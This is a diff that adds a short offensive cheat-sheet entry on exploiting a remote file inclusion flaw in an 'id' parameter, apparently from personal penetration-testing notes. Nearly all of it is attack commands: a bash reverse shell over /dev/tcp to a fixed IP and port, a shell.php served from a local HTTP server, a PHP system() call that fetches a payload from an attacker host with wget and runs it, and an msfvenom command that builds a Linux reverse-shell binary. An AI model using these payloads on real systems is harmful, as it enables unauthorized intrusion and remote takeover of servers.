@@ -1,0 +1,14 @@
+-------------------------------------------------------
+# RFI - here we have id parameter vulnerable to RFI
+bash -c 'bash -i >& /dev/tcp/172.20.0.23/5555 0>&1'  - paste in a file(shell.php) and put on your python3 -m http.server 8000 
+ip.com/id=http://attackerip:8000/shell.php
+
+Also our shell.php can look like this => 
+<pre>
+system("wget http//attackip/offsec -O /tmp/offsec ; chmod 755 /tmp/offsec ; /tmp/offsec");
+</pre>
+
+However in some cases it will not work then you have to create your payload with msfvenom
+msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=x.x.x.x LPORT=y.y.y.y -o offsec -- and repeate privious step 
+ip.com/id=http://attackerip:8000/offsec
+---------------------------------------------------------
